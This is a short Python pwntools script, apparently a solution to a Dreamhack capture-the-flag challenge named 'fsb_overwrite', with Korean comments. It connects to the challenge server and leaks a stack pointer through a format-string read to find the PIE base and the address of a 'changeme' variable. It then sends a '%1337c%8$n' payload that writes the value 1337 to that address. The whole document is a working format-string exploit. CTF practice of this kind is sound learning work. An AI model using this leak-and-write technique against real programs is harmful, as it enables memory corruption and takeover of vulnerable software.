from pwn import *

# p = process('./fsb_overwrite')
p = remote('host3.dreamhack.games', 10204)
e = ELF('./fsb_overwrite')

def slog(name, addr) : return success(': '.join([name, hex(addr)]))

# changeme의 주소 구하기
fstring = b'%8$p'
p.sendline(fstring)
leaked = int(p.recvline()[:-1], 16)
pie_base = leaked - e.symbols['__libc_csu_init']
changeme = pie_base + e.symbols['changeme']
slog('PIE base', pie_base)
slog('changeme', changeme)

# printf("%1337c%?$n") <?$는 changeme의 주소>
# 가 목표인 것이다~
fstring = b'%1337c%8$n' + b'A' * 6
fstring += p64(changeme)
p.send(fstring)
p.interactive()